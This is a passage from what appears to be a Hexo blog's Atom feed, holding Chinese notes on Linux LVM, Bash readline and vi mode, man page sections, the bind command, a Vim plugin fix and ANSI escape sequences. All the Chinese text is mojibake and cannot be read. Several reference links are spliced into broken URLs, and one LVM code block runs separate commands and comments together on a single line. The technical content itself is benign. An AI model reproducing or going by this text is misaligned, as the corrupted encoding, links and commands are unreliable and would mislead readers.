    <content type="html"><![CDATA[<hr><p><a href="https://b23.tv/ZLSREqz">Linux LVMåˆ†åŒºä¸åº”ç”¨ä¸è¯¦è§£-å“”å“©å“”å“©</a></p><hr><h1 id="ä¼ ç»Ÿç£ç›˜ç®¡ç†"><a href="#ä¼ ç»Ÿç£ç›˜ç®¡ç†" class="headerlink" title="ä¼ ç»Ÿç£ç›˜ç®¡ç†"></a>ä¼ ç»Ÿç£ç›˜ç®¡ç†</h1><p>æ— æ³•æ‰©å……å…¶å¤§å°ï¼Œåªèƒ½é€šè¿‡æ·»åŠ ç¡¬ç›˜ã€åˆ›å»ºæ–°çš„åˆ†åŒºæ¥æ‰©å……ç©ºé—´ã€‚</p><h1 id="LVM"><a href="#LVM" class="headerlink" title="LVM"></a>LVM</h1><p>Logical Volume Manager, å°è£…åº•å±‚ç‰©ç†ç¡¬ç›˜ï¼Œä»¥é€»è¾‘å·çš„å½¢å¼è¡¨ç°ç»™ä¸Šå±‚ç³»ç»Ÿï¼Œå¤§å°å¯åŠ¨æ€è°ƒæ•´ã€‚å°±æ˜¯ä½ ä¸çŸ¥é“ä¸‹é¢å¹²äº†ä»€ä¹ˆï¼Œæ“ä½œç³»ç»Ÿå¸®ä½ å¹²äº†è¿™äº›å·¥ä½œã€‚</p><p>è¿™æ ·åº•å±‚çš„æ“ä½œå°±ä¸ä¼šå½±å“ä¸Šå±‚çš„æ“ä½œç³»ç»Ÿã€‚</p><p>å°±æ˜¯ä¸€ç§ç£ç›˜ç®¡ç†æœºåˆ¶ã€‚</p><h2 id="å››ä¸ªæ¦‚å¿µ"><a href="#å››ä¸ªæ¦‚å¿µ" class="headerlink" title="å››ä¸ªæ¦‚å¿µ"></a>å››ä¸ªæ¦‚å¿µ</h2><ul><li>PE, Physical Extend, ç‰©ç†æ‹“å±•ï¼Œæ˜¯é€»è¾‘å·ç©ºé—´ç®¡ç†çš„æœ€åŸºæœ¬å•ä½ï¼Œé»˜è®¤æ˜¯4Må¤§å°ã€‚</li><li>PV, Physical Volume,  ç‰©ç†å·</li><li>VG, Volume Group, å·ç»„ï¼Œç›¸å½“äºä¸€ä¸ªå†…å­˜æ± ã€‚</li><li>LV, Logical Volume, é€»è¾‘å·</li></ul><p>æˆ‘ä»¬æœ€ç»ˆæ“ä½œä½¿ç”¨çš„æ˜¯é€»è¾‘å·ï¼Œé€»è¾‘å·æ˜¯ä¸ºäº†å–ä»£åŸæœ¬çš„ç¡¬ç›˜å’Œåˆ†åŒºã€‚</p><h3 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h3><ol><li>å…ˆå°†åº•å±‚ç¡¬ç›˜æ ¼å¼åŒ–ä¸ºPVç‰©ç†å·ï¼Œå®è´¨ä¸Šæ˜¯æŠŠç¡¬ç›˜åˆ’åˆ†ä¸ºä¸€ä¸ªä¸€ä¸ªçš„PEç‰©ç†æ‰©å±•ã€‚</li><li>åˆ›å»ºVGå·ç»„ï¼Œå…¶ä½œç”¨æ˜¯è£…PEï¼Œå¯ä»¥æŠŠå¤šä¸ªPVåŠ åˆ°VGä¸­ã€‚VGçš„å¤§å°æ˜¯æ‰€æœ‰PVçš„å¤§å°ä¹‹å’Œï¼Œ</li><li>åˆ›å»ºLVé€»è¾‘å·ï¼Œå°±æ˜¯åˆ†é…VGä¸­çš„PE</li><li>ä¸ºåˆ›å»ºå¥½çš„LVé€»è¾‘å·åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿã€‚</li><li>å°†æ ¼å¼åŒ–å¥½çš„LVé€»è¾‘å·æŒ‚è½½ä½¿ç”¨ã€‚</li></ol><p>VGå’ŒLVéƒ½è¦åˆ›å»ºåç§°ä½œä¸ºæ ‡è¯†ã€‚</p><p>åˆ›å»ºå¥½ä¸€ä¸ªå·ç»„ä¹‹åå°±ä¼šå‡ºç°ä¸€ä¸ªä»¥å·ç»„åå­—å‘½åçš„æ–‡ä»¶å¤¹ <code>/dev/vgname/lvname</code> </p><p><img src="/media/16530989507068.jpg"></p><p>æ¯ä¸€ä¸ªé€»è¾‘å·çš„ç©ºé—´å¯èƒ½æ¥è‡ªä¸åŒçš„ç‰©ç†ç¡¬ç›˜ï¼Œå› ä¸ºç»„æˆVGçš„PEæ¥è‡ªä¸åŒçš„ç¡¬ç›˜ã€‚</p><p>VGå¤§å°ä¸å¤Ÿå°±å¾€é‡Œé¢åŠ ç¡¬ç›˜ï¼Œä¹Ÿå°±æ˜¯åŠ PEçš„æ•°é‡ã€‚</p><h4 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h4><p>å…ˆåˆ†å‰²ç¡¬ç›˜ï¼Œç„¶åæŠŠå†…å­˜å—æ”¾è¿›æ± å­ï¼ŒæŠŠä¸€äº›å†…å­˜å—åˆ’ä¸ºä¸€å—ï¼Œå°±å¾—åˆ°äº†LVã€‚</p><h3 id="åˆ›å»ºLVM"><a href="#åˆ›å»ºLVM" class="headerlink" title="åˆ›å»ºLVM"></a>åˆ›å»ºLVM</h3><p><img src="/media/16530999959231.jpg"></p><p>LVé€»è¾‘å·åªå¯èƒ½æ˜¯4Mçš„æ•´æ•°å€ï¼Œå³PEçš„æ•´æ•°å€ã€‚</p><p>æ­¥éª¤ï¼š</p><pre><code class="hljs">fdisk -l  #æŸ¥çœ‹pvcreate /dev/sdb /dev/sdc#å¯ç”¨ pvdisplay(è¯¦ç»†) or pvs æŸ¥çœ‹ç‰©ç†å·ä¿¡æ¯ï¼Œ vgdisplay or vgs æŸ¥çœ‹å·ç»„ä¿¡æ¯ï¼Œlvdisplay or lvs æŸ¥çœ‹é€»è¾‘å·ä¿¡æ¯ã€‚vgcreate name /dev/sdb /dev/sdclvcreate -n name -L space comefrom</code></pre><p>é€»è¾‘å·å®é™…ä½ç½®åœ¨ã€‚dev&#x2F;mapperä¸­ã€‚</p><h3 id="åˆ é™¤LVM"><a href="#åˆ é™¤LVM" class="headerlink" title="åˆ é™¤LVM"></a>åˆ é™¤LVM</h3><p><img src="/media/16531007620264.jpg"></p><p>è¦æŒ‰é¡ºåºåˆ é™¤ï¼Œè¦åˆ é™¤PVï¼Œéœ€è¦å…ˆåˆ é™¤LVï¼Œç„¶ååˆ é™¤VGï¼Œæœ€ååœ¨åˆ é™¤PVã€‚</p><h3 id="æ‹‰ä¼¸ä¸€ä¸ªé€»è¾‘å·"><a href="#æ‹‰ä¼¸ä¸€ä¸ªé€»è¾‘å·" class="headerlink" title="æ‹‰ä¼¸ä¸€ä¸ªé€»è¾‘å·"></a>æ‹‰ä¼¸ä¸€ä¸ªé€»è¾‘å·</h3><p><img src="/media/16531008720204.jpg"></p><p>å¯åœ¨çº¿æ‹‰ä¼¸ï¼Œä¸éœ€è¦å…ˆå¸è½½ã€‚æ•°æ®ä¸ä¼šä¸¢å¤±ã€‚</p><p>æ–‡ä»¶ç³»ç»Ÿçš„å¤§å°åœ¨åˆ›å»ºæ˜¯å°±å·²ç»å›ºå®šäº†ï¼Œæ‰©å±•åå¹¶æ²¡æœ‰æ›´æ–°æ–‡ä»¶ç³»ç»Ÿï¼Œæ‰€ä»¥è¦å»æ›´æ–°æ–‡ä»¶ç³»ç»Ÿã€‚</p><h3 id="æ‹‰ä¼¸å·ç»„"><a href="#æ‹‰ä¼¸å·ç»„" class="headerlink" title="æ‹‰ä¼¸å·ç»„"></a>æ‹‰ä¼¸å·ç»„</h3><p><img src="/media/16531012715759.jpg"></p><h3 id="ç¼©å°ä¸€ä¸ªé€»è¾‘å·"><a href="#ç¼©å°ä¸€ä¸ªé€»è¾‘å·" class="headerlink" title="ç¼©å°ä¸€ä¸ªé€»è¾‘å·"></a>ç¼©å°ä¸€ä¸ªé€»è¾‘å·</h3><p><img src="/media/16531013631941.jpg"></p><p>è¯æ“ä½œå¿…é¡»è¦ç¦»çº¿ï¼Œå³unmountã€‚è¦æŒ‰ç…§ä»¥ä¸Šçš„é¡ºåºã€‚</p><p>resizeå’Œç¼©å°çš„å¤§å°ä¸ä¸€è‡´æ—¶å›ä½ æŸåæ•°æ®ã€‚</p><h3 id="ç¼©å°å·ç»„"><a href="#ç¼©å°å·ç»„" class="headerlink" title="ç¼©å°å·ç»„"></a>ç¼©å°å·ç»„</h3><p><img src="/media/16531016152757.jpg"></p><h4 id="å°ç»“-1"><a href="#å°ç»“-1" class="headerlink" title="å°ç»“"></a>å°ç»“</h4><p>é¡ºåºå¾ˆé‡è¦ï¼Œæ³¨æ„å¤§å°çš„æ¢ç®—ã€‚</p><hr><h2 id="LVMçš„æ¡å¸¦åŒ–striping"><a href="#LVMçš„æ¡å¸¦åŒ–striping" class="headerlink" title="LVMçš„æ¡å¸¦åŒ–striping"></a>LVMçš„æ¡å¸¦åŒ–striping</h2><hr><p><a href="https://www.pianshen.com/article/83141522744/">å‚è€ƒ</a></p><hr><p>å°±æ˜¯æŠŠæ•°æ®è·¨è¶Šå¤šä¸ªç£ç›˜å­˜å‚¨ï¼Œå³æŠŠLVä¸Šè¿ç»­çš„æ•°æ®åˆ†æˆå¤§å°ç›¸åŒçš„å—ï¼Œç„¶åä¾æ¬¡å­˜å‚¨åœ¨å„ä¸ªç£ç›˜çš„PVä¸Šã€‚</p><hr>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki ä¸­å…³äº Bash çš„éƒ¨åˆ†</title>
    <link href="/2022/09/07/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Bash-%E7%9A%84%E9%83%A8%E5%88%86/"/>
    <url>/2022/09/07/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-Bash-%E7%9A%84%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Bash">ArchWiki</a><br>å¦‚æœ Bash ä»¥ TTY ä¸­çš„ <code>login</code>ï¼ŒSSH å®ˆæŠ¤è¿›ç¨‹ç­‰ç±»ä¼¼æ–¹æ³•æ´¾ç”Ÿå‡ºæ¥ï¼Œå…¶è¢«æˆä¸º login shell,å¯ä»¥ç”¨ <code>-l</code> æˆ– <code>--login</code> é€‰é¡¹æ¥ä½¿ç”¨è¿™ç§æ¨¡å¼.</p><p>å¦‚æœ Bash çš„æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºéƒ½è¿æ¥åˆ°ç»ˆç«¯ï¼Œå¹¶ä¸”åœ¨å¯åŠ¨çš„æ—¶å€™æ²¡æœ‰ä½¿ç”¨ <code>-c</code> é€‰é¡¹å’Œéé€‰é¡¹å‚æ•°ï¼Œå…¶è¢«ç§°ä¸º interactive shell.</p><p>æ‰€æœ‰ interactive shell (äº¤äº’å¼ shell) éƒ½æˆ–æ‰§è¡Œ <code>/etc/bash.bashrc</code> å’Œ <code>~/.bashrc</code> æ–‡ä»¶ä¸­çš„é…ç½®ã€‚</p><p>è€Œ login shell (ç™»å½• shell) è¿˜ä¼šæ‰§è¡Œ <code>/etc/profile</code> å’Œ <code>~/.bash_profile</code> ä¸­çš„é…ç½®.</p><h1 id="å‘½ä»¤è¡Œ"><a href="#å‘½ä»¤è¡Œ" class="headerlink" title="å‘½ä»¤è¡Œ"></a>å‘½ä»¤è¡Œ</h1><h2 id="Readline-åº“"><a href="#Readline-åº“" class="headerlink" title="Readline åº“"></a>Readline åº“</h2><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>readline åŒ…å¯èƒ½å·²ç»ä½œä¸º Bash çš„ä¾èµ–å®‰è£…ã€‚</p><h3 id="ç¼–è¾‘æ¨¡å¼"><a href="#ç¼–è¾‘æ¨¡å¼" class="headerlink" title="ç¼–è¾‘æ¨¡å¼"></a>ç¼–è¾‘æ¨¡å¼</h3><p>å…¶é»˜è®¤ä½¿ç”¨ <code>Emacs</code> é£æ ¼çš„å¿«æ·é”®ä¸å‘½ä»¤è¡Œäº¤äº’ã€‚</p><p>è®¾ç½® vim é£æ ¼äº¤äº’, åœ¨ <code>~/.inputrc</code> ä¸­æ·»åŠ :</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">set</span> editing-<span class="hljs-keyword">mode</span> <span class="hljs-keyword">vi</span><br></code></pre></td></tr></table></figure><p>è‹¥åªä¸º Bash è®¾ç½®ï¼Œå¯ä¿®æ”¹ <code>~/.bashrc</code>:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> -o <span class="hljs-comment">vi</span><br></code></pre></td></tr></table></figure><p>æç¤ºå½“å‰çš„ vi æ¨¡å¼, åœ¨ <code>~/.inputrc</code> ä¸­æ·»åŠ :</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">set</span> <span class="hljs-keyword">show</span>-mode-<span class="hljs-keyword">in</span>-prompt <span class="hljs-keyword">on</span><br></code></pre></td></tr></table></figure><p>é»˜è®¤ä»¥ <code>(cmd)/(ins)</code> æ ¼å¼æ˜¾ç¤ºï¼Œå¯ä»¥é€šè¿‡ <code>vi-ins-mode-string</code> å’Œ <code>vi-cmd-mode-string</code> å˜é‡è‡ªå®šä¹‰.</p><h4 id="ä¸ºæ¯ä¸ªæ¨¡å¼æŒ‡å®šä¸åŒçš„å…‰æ ‡æ ·å¼"><a href="#ä¸ºæ¯ä¸ªæ¨¡å¼æŒ‡å®šä¸åŒçš„å…‰æ ‡æ ·å¼" class="headerlink" title="ä¸ºæ¯ä¸ªæ¨¡å¼æŒ‡å®šä¸åŒçš„å…‰æ ‡æ ·å¼"></a>ä¸ºæ¯ä¸ªæ¨¡å¼æŒ‡å®šä¸åŒçš„å…‰æ ‡æ ·å¼</h4>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki ä¸­å…³äº man page</title>
    <link href="/2022/09/07/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-man-page/"/>
    <url>/2022/09/07/ArchWiki-%E4%B8%AD%E5%85%B3%E4%BA%8E-man-page/</url>
    
    <content type="html"><![CDATA[<p>man æŒ‡ manual pages.</p><p>GNU æ­£åœ¨å°† man æ‰‹å†Œæ›¿æ¢æˆ info æ–‡æ¡£ (æ”¯æŒè¶…é“¾æ¥).</p><h1 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h1><p><code>man-db</code> æä¾›äº† man å‘½ä»¤, less æ˜¯ man çš„é»˜è®¤åˆ†é¡µå™¨.</p><p><code>man-pages</code> æä¾›äº† Linux man é¡µé¢çš„å†…å®¹.</p><h1 id="é˜…è¯»æ‰‹å†Œé¡µ"><a href="#é˜…è¯»æ‰‹å†Œé¡µ" class="headerlink" title="é˜…è¯»æ‰‹å†Œé¡µ"></a>é˜…è¯»æ‰‹å†Œé¡µ</h1><p>man pages åˆ†ä¸ºå¾ˆå¤šæ®µè½ï¼š</p><ul><li>1 User commands, ç”¨æˆ·å¯ä»¥åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œçš„å‘½ä»¤</li><li>2 System calls, å†…æ ¸ä¸­å°è£…çš„å‡½æ•°</li><li>3 Library calls, æ‰€æœ‰ library functions é™¤äº† the system call wrappers (å¤§å¤šæ•°ä¸º libc function)</li><li>4 Special files (device), Files found in &#x2F;dev which allow to access to devices through the kernel</li><li>5 File formats and configuration files, æè¿°å„ç§ human-readable file å’Œé…ç½®æ–‡ä»¶</li><li>6 Games, Games and funny little programs available on the system</li><li>7 Overview, conventions, and miscellaneous. Overviews or description of various topics, conventions, and protocols, character set standards, the standard filesystem layout, and miscellaneous other things</li><li>8 System management commands, å¦‚ mount è¿™ç±»å‘½ä»¤ï¼Œå¤§å¤šä¸º root ç”¨æˆ·æ‰èƒ½æ‰§è¡Œ</li></ul><p>man pages é€šè¿‡åç§°å’Œæ‰€å±åˆ†ç±»æ ‡è¯†ï¼Œå¯æŒ‡å®šåˆ†ç±»ä»¥è®¿é—®éœ€è¦çš„æ‰‹å†Œï¼Œå¦‚:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">man</span> <span class="hljs-number">5</span> passwd<br></code></pre></td></tr></table></figure><p>è¿™ä¼šæ˜¾ç¤º <code>/etc/passwd</code> è¿™ä¸ªæ–‡ä»¶çš„ä¿¡æ¯.</p><h1 id="æœç´¢æ‰‹å†Œé¡µ"><a href="#æœç´¢æ‰‹å†Œé¡µ" class="headerlink" title="æœç´¢æ‰‹å†Œé¡µ"></a>æœç´¢æ‰‹å†Œé¡µ</h1><p>å¯ä»¥é€šè¿‡ <code>-k</code> æˆ–è€… <code>--apropos</code> å‚æ•°æŒ‰æŒ‡å®šå…³é”®è¯æœç´¢ç›¸å…³æ‰‹å†Œ.</p><p>å…³é”®è¯æœç´¢æ˜¯ä»ä¸€ä¸ªä¸“ç”¨çš„ç¼“å­˜ç”Ÿæˆçš„ï¼Œé»˜è®¤æƒ…å†µä¸‹æ²¡æœ‰è¿™ä¸ªç¼“å­˜ï¼Œä¼šå¾—åˆ° <code>nothing appropriate</code> è¿™ä¸ªæŠ¥é”™ï¼Œå¯ä»¥é€šè¿‡ <code>mandb</code> å‘½ä»¤ç”Ÿæˆç¼“å­˜,</p><p>æ¯æ¬¡å®‰è£…æ–°çš„ manpage ä¹‹åéƒ½è¦è¿è¡Œ <code>mandb</code> ç¼“å­˜æ‰ä¼šæ›´æ–°. å…³é”®å­—å¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ã€‚</p><p>ä½¿ç”¨ <code>whatis</code> å‘½ä»¤å¯ä»¥åªæ˜¾ç¤ºéœ€è¦çš„ man page çš„ç®€è¦ä¿¡æ¯.</p><h1 id="ä½¿ç”¨æµè§ˆå™¨é˜…è¯»-man-page"><a href="#ä½¿ç”¨æµè§ˆå™¨é˜…è¯»-man-page" class="headerlink" title="ä½¿ç”¨æµè§ˆå™¨é˜…è¯» man page"></a>ä½¿ç”¨æµè§ˆå™¨é˜…è¯» man page</h1><p>åœ¨ Arch ä¸­:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> man -H <span class="hljs-keyword">free</span><br></code></pre></td></tr></table></figure><h1 id="è½¬æ¢æˆ-pdf"><a href="#è½¬æ¢æˆ-pdf" class="headerlink" title="è½¬æ¢æˆ pdf"></a>è½¬æ¢æˆ pdf</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">$ man -t <span class="hljs-tag">&lt;<span class="hljs-name">manpage</span>&gt;</span> | ps2pdf - <span class="hljs-tag">&lt;<span class="hljs-name">pdf</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨ bind å‘½ä»¤ç»‘å®šé”®ä½</title>
    <link href="/2022/09/07/%E4%BD%BF%E7%94%A8-bind-%E5%91%BD%E4%BB%A4%E7%BB%91%E5%AE%9A%E9%94%AE%E4%BD%8D/"/>
    <url>/2022/09/07/%E4%BD%BF%E7%94%A8-bind-%E5%91%BD%E4%BB%A4%E7%BB%91%E5%AE%9A%E9%94%AE%E4%BD%8D/</url>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/cnds123321/article/details/124815867">å‚è€ƒ</a></p><p><a href="https://www.geeksforgeeks.org/bind-command-in-linux-with-examples/">å‚è€ƒ</a></p><p><a href="https://www.computerhope.com/unix/bash/bind.htm">å‚è€ƒ</a><br>Arch ä¸­ä¼¼ä¹æ²¡æœ‰å†…ç½®è¿™ä¸ªå‘½ä»¤ï¼Œéœ€è¦è‡ªå·±å®‰è£…:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S <span class="hljs-built_in">bind</span><br></code></pre></td></tr></table></figure><h1 id="bind-è¡¨ç¤ºé”®çš„æ–¹å¼"><a href="#bind-è¡¨ç¤ºé”®çš„æ–¹å¼" class="headerlink" title="bind è¡¨ç¤ºé”®çš„æ–¹å¼"></a>bind è¡¨ç¤º<mark>é”®</mark>çš„æ–¹å¼</h1><p><code>bind</code> ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦å’Œæ–‡æœ¬å­—ç¬¦ä¸²çš„æ–¹å¼æ¥è¡¨ç¤ºé”®ç›˜:</p><ul><li><code>\C-</code>, è¡¨ç¤ºæŒ‰ä½ <code>Ctrl</code> é”®åŠ ä¸Š <code>-</code> åé¢çš„é”®ï¼Œå¦‚ <code>\C-A</code> è¡¨ç¤º <code>Ctrl+A</code> </li><li><code>\e</code>, è½¬ä¹‰é”®, ç»‘å®šå…ƒé”®ï¼Œ<code>Alt</code> æ˜¯é”®ç›˜ä¸Šçš„å…ƒé”®</li></ul><h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><p>è¯­æ³•:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bind</span><span class="hljs-meta"> [é€‰é¡¹]</span><br></code></pre></td></tr></table></figure><h2 id="æŸ¥æ‰¾ç¼–ç çš„é»˜è®¤ç»„åˆ"><a href="#æŸ¥æ‰¾ç¼–ç çš„é»˜è®¤ç»„åˆ" class="headerlink" title="æŸ¥æ‰¾ç¼–ç çš„é»˜è®¤ç»„åˆ"></a>æŸ¥æ‰¾ç¼–ç çš„é»˜è®¤ç»„åˆ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">bind</span> -P<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥é€šè¿‡æŸ¥çœ‹ <code>/etc/inputrc</code> æ–‡ä»¶ã€‚</p><h2 id="æŸ¥æ‰¾é”®ç "><a href="#æŸ¥æ‰¾é”®ç " class="headerlink" title="æŸ¥æ‰¾é”®ç "></a>æŸ¥æ‰¾é”®ç </h2><p>ä½¿ç”¨ <code>Ctrl+v</code> ç„¶ååŠ ä¸€ä¸ªé”®ï¼Œå°±å¯ä»¥æŸ¥è¯¢è¯¥é”®çš„é”®ç .</p><p>å¦‚å…ˆæŒ‰ <code>Ctrl+v</code> ç„¶åæŒ‰ <code>F7</code>, ç»“æœä¸º <code>^[[18ï½</code> è¿™é‡Œçš„ <code>^[</code> æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œå¯ä»¥è¡¨ç¤ºä¸º:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\e[18~</span><br></code></pre></td></tr></table></figure><h2 id="é€‰é¡¹"><a href="#é€‰é¡¹" class="headerlink" title="é€‰é¡¹"></a>é€‰é¡¹</h2><ul><li><code>-l</code>, åˆ—å‡ºæ‰€æœ‰å¯ç»‘å®šç¼–è¾‘çš„å‡½æ•°çš„åç§°</li><li><code>-P</code></li><li><code>-p</code></li><li><code>-S</code>, åˆ—å‡ºè°ƒç”¨å®çš„é”®åºåˆ—åŠå…¶å€¼</li><li><code>-s</code>, å’Œ <code>-S</code>, ç›¸åŒï¼Œä½†å¯ä»¥ç”¨ä½œ <code>bind</code> è¾“å…¥çš„å½¢å¼æä¾›è¾“å‡º</li><li><code>-V</code>, åˆ—å‡ºåœ¨ bash é”®ç»‘å®šä¸­ä½¿ç”¨çš„å˜é‡å’Œå€¼</li><li><code>-v</code></li><li><code>-q</code>, æŸ¥è¯¢</li><li><code>-u function-name</code>, è§£é™¤ç»‘å®šåˆ°è¿™ä¸ªå‡½æ•°ä¸Šçš„æ‰€æœ‰é”® </li><li><code>-r keyseq</code> </li><li><code>-f filename</code>, ä»æ–‡ä»¶ä¸­è¯»å–é”®ç»‘å®šï¼Œå¹¶ä½œä¸º <code>bind</code> å‘½ä»¤çš„è¾“å…¥</li><li><code>-x keyseq:shell-command</code>, ç»‘å®šå‘½ä»¤</li><li><code>-X</code></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³ vim æ’ä»¶ Ultisnips å¯¹ markdown æ–‡ä»¶æ— æ•ˆé—®é¢˜</title>
    <link href="/2022/09/07/%E8%A7%A3%E5%86%B3-vim-%E6%8F%92%E4%BB%B6-Ultisnips-%E5%AF%B9-markdown-%E6%96%87%E4%BB%B6%E6%97%A0%E6%95%88%E9%97%AE%E9%A2%98/"/>
    <url>/2022/09/07/%E8%A7%A3%E5%86%B3-vim-%E6%8F%92%E4%BB%B6-Ultisnips-%E5%AF%B9-markdown-%E6%96%87%E4%BB%B6%E6%97%A0%E6%95%88%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>åˆ é™¤ <code>vim-markdown</code> è¿™ä¸ªæ’ä»¶å°±å¯ä»¥è§£å†³.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åŒºåˆ† Non-printing character å’Œ Escape character</title>
    <link href="/2022/09/07/%E5%8C%BA%E5%88%86-Non-printing-character-%E5%92%8C-Escape-character/"/>
    <url>/2022/09/07/%E5%8C%BA%E5%88%86-Non-printing-character-%E5%92%8C-Escape-character/</url>
    
    <content type="html"><![CDATA[<p><a href="https://en.wikipedia.org/wiki/Non-printing_character_in_word_processors">reference 1</a><br><a href="https://en.wikipedia.org/wiki/Non-printing_character_in_word_processor://en.wikipedia.org/wiki/Escape_character">reference 2</a></p><h1 id="Non-printing-character-in-word-processors"><a href="#Non-printing-character-in-word-processors" class="headerlink" title="Non-printing character in word processors"></a>Non-printing character in word processors</h1><p>Non-printing character æˆ–è€…è¯´ formatting marks æ˜¯åœ¨ word processors ç”¨æ¥ design content çš„ characters. å…¶ä¸æ˜¯ç”¨æ¥æ‰“å°æˆ–æ˜¾ç¤ºçš„ã€‚</p><p>åœ¨ word processors ä¸­æœ€å¸¸è§çš„ non-printable characters æœ‰:</p><ul><li>pilcrow, æ®µè½ç¬¦å·</li><li>space</li><li>non-breaking space</li><li>tab</li></ul><h1 id="Escape-character"><a href="#Escape-character" class="headerlink" title="Escape character"></a>Escape character</h1><h2 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h2><p>ä¸€ä¸ª escape character ä¸æ˜¯ control character.</p><p>Escape sequence æ˜¯æŒ‡åœ¨è½¬ä¹‰æ—¶ä½¿ç”¨çš„æœ‰åºå­—ç¬¦ç»„åˆ.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ANSI è½¬ç§»åºåˆ—</title>
    <link href="/2022/09/07/ANSI-%E8%BD%AC%E7%A7%BB%E5%BA%8F%E5%88%97/"/>
    <url>/2022/09/07/ANSI-%E8%BD%AC%E7%A7%BB%E5%BA%8F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zh.wikipedia.org/wiki/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6">å‚è€ƒ1</a><br><a href="https://zh.wikipedia.org/wiki/ANSI%E8%BD%AC%E4%B9%89%E5%BA%8F%E5%88%97">å‚è€ƒ2</a><br><a href="https://zh.wikipedia.org/wiki/ANSI%E8%BD%AC%E4%B9%89%E5%BA%8F%E5%88%9://blog.csdn.net/linux_rm/article/details/124732456">å‚è€ƒ3</a><br><a href="https://zh.wikipedia.org/wiki/ANSI%E8%BD%AC%E4%B9%89%E5%BA%8F%E5%88%9://blog.csdn.net/linux_rm/article/details/12473245://www.mardan.wiki/website/2019/04/23/%E4%BF%AE%E6%94%B9terminal%E9%BB%98%E8%AE%A4%E6%8F%90%E7%A4%BA%E6%A0%B7%E5%BC%8F">å‚è€ƒ4</a><br>ä¸»è¦æ˜¯è§£å†³æˆ‘ <code>\[  \]</code> æœªç†è§£åˆ°çš„é—®é¢˜.</p><p>æš‚æ—¶ç†è§£ä¸ºï¼Œæœ‰ä¸€éƒ¨åˆ†å­—ç¬¦çš„å®šä¹‰æ˜¯ â€œç§æœ‰çš„â€, ä»¥ä¾¿ç»ˆç«¯åˆ¶é€ å•†å¯ä»¥æ’å…¥ä»–ä»¬è‡ªå·±çš„åºåˆ—è€Œä¸ä¸æ ‡å‡†ç›¸å†²çªï¼Œå› æ­¤ç”¨ <code>\[ \]</code> åŒ…è£¹èµ·æ¥.</p><h1 id="å‚è€ƒ-2-å†…å®¹"><a href="#å‚è€ƒ-2-å†…å®¹" class="headerlink" title="å‚è€ƒ 2 å†…å®¹"></a>å‚è€ƒ 2 å†…å®¹</h1><p>åºåˆ—å…·æœ‰ä¸åŒçš„é•¿åº¦ï¼Œæ‰€æœ‰åºåˆ—éƒ½ä»¥ ASCII å­—ç¬¦ <code>ESC</code> å³ <code>\</code> å¼€å¤´ï¼Œç¬¬äºŒä¸ªå­—èŠ‚åˆ™æ˜¯ 0x40 ï½ 0x5F 